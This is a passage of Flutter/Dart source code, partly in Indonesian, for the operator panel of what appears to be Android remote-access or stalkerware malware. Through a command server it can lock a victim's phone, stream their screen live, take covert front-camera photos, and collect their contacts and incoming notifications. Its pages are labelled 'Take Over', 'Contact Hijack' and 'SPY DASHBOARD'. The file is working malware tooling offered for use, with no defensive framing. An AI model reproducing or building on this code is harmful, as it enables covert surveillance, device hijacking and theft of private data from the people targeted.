          value: val,
          groupValue: groupVal,
          onChanged: onChange,
          fillColor: MaterialStateProperty.all(color)),
      Text(label,
          style: const TextStyle(
              fontFamily: _font, color: Colors.white70, fontSize: 13)),
    ]);
  }

  Widget _cancelBtn(BuildContext ctx) => OutlinedButton(
        style: OutlinedButton.styleFrom(
          padding: const EdgeInsets.symmetric(vertical: 12),
          side: BorderSide(color: Colors.white.withOpacity(0.2)),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
        ),
        onPressed: () => Navigator.pop(ctx),
        child: const Text("Cancel",
            style: TextStyle(
                fontFamily: _font, color: Colors.white54, fontSize: 14)),
      );

  Widget _actionBtn(String label, Color color, VoidCallback onTap) =>
      Container(
        decoration: BoxDecoration(
          color: color.withOpacity(0.15),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.5)),
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            borderRadius: BorderRadius.circular(10),
            onTap: onTap,
            child: Padding(
              padding: const EdgeInsets.symmetric(vertical: 12),
              child: Center(
                child: Text(label,
                    style: TextStyle(
                        fontFamily: _font,
                        color: color,
                        fontSize: 14,
                        fontWeight: FontWeight.bold)),
              ),
            ),
          ),
        ),
      );

  Widget _infoRow(String key, String val) => Padding(
        padding: const EdgeInsets.only(bottom: 8),
        child: Row(children: [
          Text("$key: ",
              style: const TextStyle(
                  fontFamily: _font,
                  color: Colors.white38,
                  fontSize: 13)),
          Expanded(
            child: Text(val,
                style: const TextStyle(
                    fontFamily: _font,
                    color: Colors.white,
                    fontSize: 13,
                    fontWeight: FontWeight.bold)),
          ),
        ]),
      );

  String _formatTime(int timestamp) {
    var d = DateTime.fromMillisecondsSinceEpoch(timestamp);
    return '${d.hour.toString().padLeft(2, '0')}:${d.minute.toString().padLeft(2, '0')}';
  }

  void openSpyCenter() => Navigator.push(context,
      MaterialPageRoute(
          builder: (_) =>
              SpyCenterPage(deviceId: deviceId, serverUrl: server)));

  Widget _glow(double size, double opacity) => Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: RadialGradient(colors: [
            const Color(0xFF25D366).withOpacity(opacity),
            Colors.transparent,
          ]),
        ),
      );

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF07110A),
      body: Stack(
        children: [
          Positioned(top: -80,  left: -80,  child: _glow(220, 0.12)),
          Positioned(top: -60,  right: -60, child: _glow(180, 0.08)),
          Positioned(bottom: -70, left: -70, child: _glow(200, 0.09)),
          Positioned(bottom: -60, right: -60, child: _glow(180, 0.10)),

          SafeArea(
            child: Column(
              children: [
                _buildHeader(),
                const SizedBox(height: 12),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  child: _buildLogBox(),
                ),
                const SizedBox(height: 12),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  child: _buildTabRow(),
                ),
                const SizedBox(height: 12),
                Expanded(
                  child: SingleChildScrollView(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 100),
                    child: _buildTabContent(),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return ClipRRect(
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [
              const Color(0xFF0D2415).withOpacity(0.75),
              const Color(0xFF25D366).withOpacity(0.10),
            ]),
            border: Border(
                bottom: BorderSide(
                    color: const Color(0xFF25D366).withOpacity(0.18))),
          ),
          child: Row(
            children: [
              Container(
                width: 46,
                height: 46,
                decoration: BoxDecoration(
                  color: isOnline
                      ? const Color(0xFF25D366).withOpacity(0.12)
                      : Colors.white.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: isOnline
                        ? const Color(0xFF25D366).withOpacity(0.4)
                        : Colors.white.withOpacity(0.1),
                  ),
                ),
                child: Icon(Icons.phone_android,
                    color: isOnline
                        ? const Color(0xFF25D366)
                        : Colors.white38,
                    size: 24),
              ),
              const SizedBox(width: 12),

              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      "VOID\u2014$deviceName",
                      style: const TextStyle(
                        fontFamily: _font,
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        fontSize: 15,
                        letterSpacing: 0.8,
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                    const SizedBox(height: 4),
                    Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: isOnline
                            ? const Color(0xFF25D366).withOpacity(0.15)
                            : Colors.redAccent.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(
                          color: isOnline
                              ? const Color(0xFF25D366).withOpacity(0.4)
                              : Colors.redAccent.withOpacity(0.4),
                        ),
                      ),
                      child: Row(mainAxisSize: MainAxisSize.min, children: [
                        Container(
                          width: 6,
                          height: 6,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: isOnline
                                ? const Color(0xFF25D366)
                                : Colors.redAccent,
                          ),
                        ),
                        const SizedBox(width: 5),
                        Text(
                          isOnline ? "Online" : "Offline",
                          style: TextStyle(
                            fontFamily: _font,
                            color: isOnline
                                ? const Color(0xFF25D366)
                                : Colors.redAccent,
                            fontSize: 11,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ]),
                    ),
                  ],
                ),
              ),

              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.all(9),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.35),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                        color: Colors.white.withOpacity(0.12)),
                  ),
                  child: const Icon(Icons.arrow_back_ios_new_rounded,
                      color: Colors.white60, size: 16),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildLogBox() {
    return ClipRRect(
      borderRadius: BorderRadius.circular(14),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
        child: Container(
          height: 90,
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.45),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
                color: const Color(0xFF25D366).withOpacity(0.18),
                width: 1.2),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [
                const Icon(Icons.terminal, color: Colors.white38, size: 12),
                const SizedBox(width: 5),
                const Text("Log Activity",
                    style: TextStyle(
                        fontFamily: _font,
                        color: Colors.white38,
                        fontSize: 11,
                        letterSpacing: 1.0)),
                const Spacer(),
                AnimatedBuilder(
                  animation: _pulseCtrl,
                  builder: (_, __) => Container(
                    width: 6, height: 6,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: const Color(0xFF25D366).withOpacity(
                          0.5 + 0.5 * _pulseCtrl.value),
                    ),
                  ),
                ),
              ]),
              const SizedBox(height: 6),
              Expanded(
                child: _cmdLog.isEmpty
                    ? const Text("— No activity yet —",
                        style: TextStyle(
                            fontFamily: _font,
                            color: Colors.white24,
                            fontSize: 10,
                            fontStyle: FontStyle.italic))
                    : ListView.builder(
                        physics: const NeverScrollableScrollPhysics(),
                        itemCount: _cmdLog.length > 3 ? 3 : _cmdLog.length,
                        itemBuilder: (_, i) {
                          final log = _cmdLog[i];
                          final isErr =
                              log['status']?.startsWith('error') ?? false;
                          return Text(
                            "[${log['time']}] ${log['cmd']} → ${log['status']}",
                            style: TextStyle(
                              fontFamily: _font,
                              color: isErr
                                  ? Colors.redAccent
                                  : const Color(0xFF25D366),
                              fontSize: 10,
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildTabRow() {
    const tabs = [
      {'key': 'takeover',  'label': 'Take Over'},
      {'key': 'contact',   'label': 'Contact Hijack'},
      {'key': 'hijacking', 'label': 'Device Hijacking'},
      {'key': 'research',  'label': 'Device Research'},
    ];
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      physics: const BouncingScrollPhysics(),
      child: Row(
        children: tabs.map((t) {
          final active = _activeTab == t['key'];
          return GestureDetector(
            onTap: () => setState(() => _activeTab = t['key']!),
            child: Container(
              margin: const EdgeInsets.only(right: 20),
              child: AnimatedDefaultTextStyle(
                duration: const Duration(milliseconds: 200),
                style: TextStyle(
                  fontFamily: _font,
                  color: active
                      ? const Color(0xFF25D366)
                      : Colors.white38,
                  fontSize: active ? 15 : 13,
                  fontWeight: active
                      ? FontWeight.bold
                      : FontWeight.normal,
                  letterSpacing: active ? 0.8 : 0.3,
                  shadows: active
                      ? [
                          Shadow(
                              color: const Color(0xFF25D366)
                                  .withOpacity(0.5),
                              blurRadius: 6)
                        ]
                      : [],
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(t['label']!),
                    const SizedBox(height: 3),
                    AnimatedContainer(
                      duration: const Duration(milliseconds: 200),
                      height: 2,
                      width: active ? 28.0 : 0.0,
                      decoration: BoxDecoration(
                        color: const Color(0xFF25D366),
                        borderRadius: BorderRadius.circular(1),
                        boxShadow: [
                          BoxShadow(
                              color: const Color(0xFF25D366)
                                  .withOpacity(0.6),
                              blurRadius: 4)
                        ],
                      ),
                    ),
                  ],
                ),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }

  Widget _buildTabContent() {
    switch (_activeTab) {
      case 'takeover':
        return _buildTakeOverTab();
      case 'contact':
        return _buildContactHijackTab();
      default:
        return _buildComingSoon();
    }
  }

  Widget _buildTakeOverTab() {
    return Column(
      children: [
        _bannerCard(
          iconData: Icons.lock_outline,
          iconColor: Colors.redAccent,
          title: "Locked Menu",
          content: Column(children: [
            Row(children: [
              Expanded(
                child: _wideBtn(
                  icon: Icons.lock,
                  label: "Locked (Non Hard)",
                  color: const Color(0xFFC62828),
                  onTap: showLockDialog,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _wideBtn(
                  icon: Icons.lock,
                  label: "Locked (Hard)",
                  color: const Color(0xFFB71C1C),
                  onTap: showLockhardDialog,
                ),
              ),
            ]),
            const SizedBox(height: 10),
            _wideBtn(
              icon: Icons.lock_open_outlined,
              label: "Unlocked",
              color: const Color(0xFF2E7D32),
              onTap: () => sendCmd("UNLOCK", {}),
              fullWidth: true,
            ),
          ]),
        ),

        const SizedBox(height: 14),

        _bannerCard(
          iconData: Icons.warning_amber_outlined,
          iconColor: Colors.orangeAccent,
          title: "Basic System Menu",
          content: Column(children: [
            Row(children: [
              Expanded(
                child: _wideBtn(
                  icon: Icons.flashlight_on,
                  label: "Flash On",
                  color: const Color(0xFFF9A825),
                  onTap: () => sendCmd("FLASH_ON", {}),
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _wideBtn(
                  icon: Icons.auto_awesome,
                  label: "Flash Disko",
                  color: const Color(0xFF6A1B9A),
                  onTap: () => sendCmd("DISCO_START", {}),
                ),
              ),
            ]),
            const SizedBox(height: 10),
            Row(children: [
              Expanded(
                child: _wideBtn(
                  icon: Icons.flashlight_off,
                  label: "Kill Flash",
                  color: const Color(0xFF1B5E20),
                  onTap: () => sendCmd("FLASH_OFF", {}),
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _wideBtn(
                  icon: Icons.auto_awesome_outlined,
                  label: "Kill Disko Flash",
                  color: const Color(0xFF1B5E20),
                  onTap: () => sendCmd("DISCO_STOP", {}),
                ),
              ),
            ]),
          ]),
        ),

        const SizedBox(height: 14),

        _bannerCard(
          iconData: Icons.volume_up_outlined,
          iconColor: Colors.blueAccent,
          title: "System Simple",
          content: Row(children: [
            Expanded(
              child: _wideBtn(
                icon: Icons.speaker,
                label: "Play Sound",
                color: const Color(0xFF1565C0),
                onTap: showAlarmDialog,
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: _wideBtn(
                icon: Icons.image_outlined,
                label: "Set Wallpaper",
                color: const Color(0xFF37474F),
                onTap: showWallpaperDialog,
              ),
            ),
          ]),
        ),
      ],
    );
  }

  Widget _buildContactHijackTab() {
    return Column(
      children: [
        _bannerCard(
          iconData: Icons.radar,
          iconColor: const Color(0xFF25D366),
          title: "Data Device",
          content: Row(children: [
            Expanded(
              child: _wideBtn(
                icon: Icons.contacts_outlined,
                label: "Get All Contact",
                color: const Color(0xFF0277BD),
                onTap: _fetchAndShowContacts,
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: _wideBtn(
                icon: Icons.notifications_outlined,
                label: "Cek Notif Masuk",
                color: const Color(0xFFC62828),
                onTap: _fetchAndShowNotifications,
              ),
            ),
          ]),
        ),
      ],
    );
  }

  Widget _buildComingSoon() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.only(top: 60),
        child: Column(
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: const Color(0xFF25D366).withOpacity(0.06),
                border: Border.all(
                    color: const Color(0xFF25D366).withOpacity(0.2)),
              ),
              child: const Icon(Icons.rocket_launch_outlined,
                  color: Color(0xFF25D366), size: 36),
            ),
            const SizedBox(height: 16),
            const Text("Coming Soon",
                style: TextStyle(
                    fontFamily: _font,
                    color: Colors.white54,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 2.0)),
            const SizedBox(height: 8),
            const Text("Fitur ini sedang dalam pengembangan",
                style: TextStyle(
                    fontFamily: _font, color: Colors.white24, fontSize: 12)),
          ],
        ),
      ),
    );
  }

  Widget _bannerCard({
    required IconData iconData,
    required Color iconColor,
    required String title,
    required Widget content,
  }) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(14),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
        child: Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.42),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
                color: Colors.white.withOpacity(0.09), width: 1.2),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: iconColor.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                        color: iconColor.withOpacity(0.3)),
                  ),
                  child: Icon(iconData, color: iconColor, size: 18),
                ),
                const SizedBox(width: 10),
                Text(title,
                    style: const TextStyle(
                        fontFamily: _font,
                        color: Colors.white,
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.6)),
              ]),
              const SizedBox(height: 12),
              content,
            ],
          ),
        ),
      ),
    );
  }

  Widget _wideBtn({
    required IconData icon,
    required String label,
    required Color color,
    required VoidCallback onTap,
    bool fullWidth = false,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: fullWidth ? double.infinity : null,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 11),
        decoration: BoxDecoration(
          color: color.withOpacity(0.15),
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.4)),
          boxShadow: [
            BoxShadow(
                color: color.withOpacity(0.08),
                blurRadius: 6,
                spreadRadius: 1),
          ],
        ),
        child: Row(
          mainAxisSize: fullWidth ? MainAxisSize.max : MainAxisSize.min,
          mainAxisAlignment: fullWidth
              ? MainAxisAlignment.center
              : MainAxisAlignment.start,
          children: [
            Icon(icon, color: color, size: 16),
            const SizedBox(width: 7),
            Flexible(
              child: Text(
                label,
                style: TextStyle(
                  fontFamily: _font,
                  color: color,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 0.4,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==================== SPY CENTER PAGE ====================
class SpyCenterPage extends StatefulWidget {
  final String deviceId;
  final String serverUrl;
  const SpyCenterPage(
      {super.key, required this.deviceId, required this.serverUrl});

  @override
  _SpyCenterPageState createState() => _SpyCenterPageState();
}

class _SpyCenterPageState extends State<SpyCenterPage> {
  String get server => widget.serverUrl;
  String get deviceId => widget.deviceId;

  Map<String, dynamic> intelData = {};
  Timer? _timer;
  bool isLoading = true;
  bool isLiveActive = false;

  Future<void> fetchIntel() async {
    try {
      final res =
          await http.get(Uri.parse('$server/api/intel/$deviceId'));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (mounted) setState(() {
          intelData = data;
          isLoading = false;
        });
      }
    } catch (_) {}
  }

  @override
  void initState() {
    super.initState();
    fetchIntel();
    _timer = Timer.periodic(
        const Duration(seconds: 2), (t) => fetchIntel());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  // ==================== PERBAIKAN: TAMBAHKAN owner ====================
  Future<void> sendCmd(String cmd, Map? payload) async {
    final prefs = await SharedPreferences.getInstance();
    final ownerUsername = prefs.getString('admin_username') ?? '';
    
    try {
      final response = await http.post(
        Uri.parse('$server/api/command'),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "deviceId": deviceId,
          "command": cmd,
          "payload": payload,
          "owner": ownerUsername  // ← INI PENTING!
        }),
      );
      
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Sent: $cmd - ${response.statusCode}"),
          backgroundColor: response.statusCode == 200 ? Colors.green : Colors.redAccent,
        ),
      );
    } catch (e) {
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Error: $e"),
          backgroundColor: Colors.red,
        ),
      );
    }
  }

  void toggleLiveScreen() {
    if (isLiveActive) {
      sendCmd("STOP_LIVE_SCREEN", {});
      setState(() => isLiveActive = false);
    } else {
      sendCmd("START_LIVE_SCREEN", {});
      setState(() => isLiveActive = true);
    }
  }

  String? get displayImageUrl {
    if (intelData['lastCameraShot'] != null &&
        intelData['lastCameraShot'].toString().isNotEmpty)
      return intelData['lastCameraShot'];
    if (intelData['lastScreenshot'] != null &&
        intelData['lastScreenshot'].toString().isNotEmpty)
      return intelData['lastScreenshot'];
    return null;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      appBar: AppBar(
        title: const Text("SPY DASHBOARD",
            style: TextStyle(
                fontWeight: FontWeight.bold, letterSpacing: 1.0)),
        backgroundColor: const Color(0xFF0A0A0A),
        elevation: 0,
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white),
            onPressed: () {
              sendCmd("GET_ALL_DATA", {});
              fetchIntel();
            },
          ),
        ],
      ),
      body: isLoading
          ? const Center(
              child: CircularProgressIndicator(color: Colors.redAccent))
          : SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              physics: const BouncingScrollPhysics(),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Stack(
                    children: [
                      Container(
                        height: 220,
                        width: double.infinity,
                        decoration: BoxDecoration(
                          color: Colors.black,
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: Colors.white24),
                        ),
                        child: ClipRRect(
                          borderRadius: BorderRadius.circular(16),
                          child: displayImageUrl != null
                              ? Image.network(
                                  displayImageUrl!,
                                  fit: BoxFit.cover,
                                  gaplessPlayback: true,
                                  headers: const {
                                    "Cache-Control": "no-cache"
                                  },
                                  loadingBuilder: (ctx, child, p) =>
                                      p == null
                                          ? child
                                          : const Center(
                                              child:
                                                  CircularProgressIndicator(
                                                      color: Colors
                                                          .redAccent)),
                                  errorBuilder: (ctx, e, st) =>
                                      const Center(
                                          child: Text("Gagal memuat gambar",
                                              style: TextStyle(
                                                  color: Colors.white24))),
                                )
                              : const Center(
                                  child: Text("No Feed",
                                      style: TextStyle(
                                          color: Colors.white24))),
                        ),
                      ),
                      if (isLiveActive)
                        Positioned(
                          top: 10, left: 10,
                          child: Container(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 8, vertical: 4),
                            decoration: BoxDecoration(
                                color: Colors.red,
                                borderRadius: BorderRadius.circular(8)),
                            child: const Text("LIVE",
                                style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.bold)),
                          ),
                        ),
                      if (displayImageUrl != null &&
                          intelData['lastCameraShot'] != null &&
                          displayImageUrl == intelData['lastCameraShot'])
                        Positioned(
                          top: 10, right: 10,
                          child: Container(
                            padding: const EdgeInsets.symmetric(
                                horizontal: 8, vertical: 4),
                            decoration: BoxDecoration(
                                color: Colors.pink,
                                borderRadius: BorderRadius.circular(8)),
                            child: const Text("CAMERA",
                                style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.bold)),
                          ),
                        ),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                            backgroundColor:
                                isLiveActive ? Colors.red : Colors.green,
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12))),
                        icon: Icon(
                            isLiveActive ? Icons.stop : Icons.play_arrow,
                            color: Colors.white),
                        label: Text(
                            isLiveActive ? "STOP LIVE" : "START LIVE",
                            style: const TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.bold)),
                        onPressed: toggleLiveScreen,
                      ),
                      const SizedBox(width: 10),
                      ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.pink,
                            shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(12))),
                        icon: const Icon(Icons.camera_front,
                            color: Colors.white),
                        label: const Text("Selfie",
                            style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.bold)),
                        onPressed: () {
                          sendCmd("CAM_FRONT", {});
                          setState(() => isLoading = true);
                          fetchIntel();
                        },
                      ),
                    ],
                  ),
                  const SizedBox(height: 30),
                  const Text("DEVICE ACTIVITY",
                      style: TextStyle(
                          color: Colors.white,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1.0)),
                  const SizedBox(height: 10),
                  Container(
                    height: 300,
                    decoration: BoxDecoration(
                      border: Border.all(
                          color: Colors.white.withOpacity(0.1)),
                      borderRadius: BorderRadius.circular(16),
                      color: const Color(0xFF121212),
                    ),
                    child: (intelData['notifications'] as List?)
                                ?.isEmpty ??
                            true
                        ? const Center(
                            child: Text("No Data Activity",
                                style:
                                    TextStyle(color: Colors.white24)))
                        : ListView.builder(
                            physics: const BouncingScrollPhysics(),
                            itemCount: (intelData['notifications'] as List)
                                .length,
                            itemBuilder: (c, i) {
                              var n = intelData['notifications'][i];
                              return ListTile(
                                dense: true,
                                leading: const Icon(
                                    Icons.notifications_active,
                                    color: Colors.redAccent),
                                title: Text(n['title'] ?? "No Title",
                                    style: const TextStyle(
                                        color: Colors.white,
                                        fontWeight: FontWeight.bold)),
                                subtitle: Text(n['text'] ?? "",
                                    style: const TextStyle(
                                        color: Colors.white54)),
                              );
                            }),
                  ),
                ],
              ),
            ),
    );
  }
}